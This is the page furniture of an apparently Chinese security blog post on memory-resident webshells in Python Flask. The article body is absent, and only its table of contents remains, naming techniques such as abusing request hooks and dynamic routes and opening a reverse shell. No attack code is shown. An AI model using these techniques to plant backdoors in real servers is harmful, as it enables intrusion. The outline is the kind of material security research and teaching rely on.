</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">阿巴</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/09/18/Python%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/">http://example.com/2024/09/18/Python%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Python/">Python</a><a class="post-meta__tags" href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/06/27/JNDI%20-(%E5%8F%AF%E8%AE%BF%E9%97%AE)JDBC%E3%80%81LDAP%E3%80%81RMI%E3%80%81DNS%E3%80%81NIS%E3%80%81CORBA%E3%80%82/" title=""><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info"></div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">阿巴</div><div class="author-info__description">仰天大笑出门去，我辈岂是蓬蒿人</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">65</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Python%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text">Python中的内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Flask%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.1.</span> <span class="toc-text">Flask中的内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E8%B7%AF%E7%94%B1"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">动态注册路由</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8%E8%AF%B7%E6%B1%82%E7%9A%84%E5%89%8D%E5%90%8E%E6%8B%A6%E6%88%AA%E8%B7%AF%E7%94%B1"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">在请求的前后拦截路由</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.1.2.</span> <span class="toc-text">构造内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">匿名函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8A%A8%E6%80%81%E8%B7%AF%E7%94%B1%E5%88%9B%E5%BB%BA%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">利用动态路由创建实现内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8A%E4%B8%8B%E6%96%87%E9%9A%94%E7%A6%BB"><span class="toc-number">1.1.2.2.1.</span> <span class="toc-text">上下文隔离</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95%E5%92%8C%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="toc-number">1.1.2.2.2.</span> <span class="toc-text">请求方法和执行结果</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E8%A7%86%E5%9B%BE%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">修改视图函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%AF%B7%E6%B1%82%E6%8B%A6%E6%88%AA%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">利用请求拦截实现内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#app-errorhandler"><span class="toc-number">1.1.2.4.1.</span> <span class="toc-text">@app.errorhandler</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#app-url-value-preprocessor"><span class="toc-number">1.1.2.4.2.</span> <span class="toc-text">@app.url_value_preprocessor</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-debug%E6%A8%A1%E5%BC%8F%E4%B8%8B%E6%8A%9B%E5%87%BA%E5%BC%82%E5%B8%B8"><span class="toc-number">1.1.2.4.2.1.</span> <span class="toc-text">1.debug模式下抛出异常</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#1-1%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">1.1.2.4.2.2.</span> <span class="toc-text">1.1方法一</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#1-2%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">1.1.2.4.2.3.</span> <span class="toc-text">1.2方法二</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#1-3-%E6%96%B9%E6%B3%95%E4%B8%89"><span class="toc-number">1.1.2.4.2.4.</span> <span class="toc-text">1.3 方法三</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-%E9%9D%9Edebug%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">1.1.2.4.2.5.</span> <span class="toc-text">2.非debug的情况</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-1%E6%B3%A8%E5%86%8C%E8%B7%AF%E7%94%B1"><span class="toc-number">1.1.2.4.2.6.</span> <span class="toc-text">2.1注册路由</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-2%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.1.2.4.2.7.</span> <span class="toc-text">2.2反弹shell</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#app-before-request"><span class="toc-number">1.1.2.4.3.</span> <span class="toc-text">@app.before_request</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#app-after-request"><span class="toc-number">1.1.2.4.4.</span> <span class="toc-text">@app.after_request</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#app-teardown-request"><span class="toc-number">1.1.2.4.5.</span> <span class="toc-text">@app.teardown_request</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#app-context-processor"><span class="toc-number">1.1.2.4.6.</span> <span class="toc-text">@app.context_processor</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/18/Python%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/" title="Python中的内存马">Python中的内存马</a><time datetime="2024-09-17T16:00:00.000Z" title="Created 2024-09-18 00:00:00">2024-09-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/27/JNDI%20-(%E5%8F%AF%E8%AE%BF%E9%97%AE)JDBC%E3%80%81LDAP%E3%80%81RMI%E3%80%81DNS%E3%80%81NIS%E3%80%81CORBA%E3%80%82/" title="Untitled">Untitled</a><time datetime="2024-06-27T13:08:05.623Z" title="Created 2024-06-27 21:08:05">2024-06-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/16/http192.168.1.14410003/" title="Untitled">Untitled</a><time datetime="2024-06-16T11:39:32.205Z" title="Created 2024-06-16 19:39:32">2024-06-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/01/%E7%9F%A9%E9%98%B5%E6%9D%AFwp/" title="Untitled">Untitled</a><time datetime="2024-06-01T06:19:50.358Z" title="Created 2024-06-01 14:19:50">2024-06-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/26/Docker%20%20PHP%E7%9A%84%E8%A3%B8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="Untitled">Untitled</a><time datetime="2024-05-26T08:06:29.598Z" title="Created 2024-05-26 16:06:29">2024-05-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By 阿巴</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>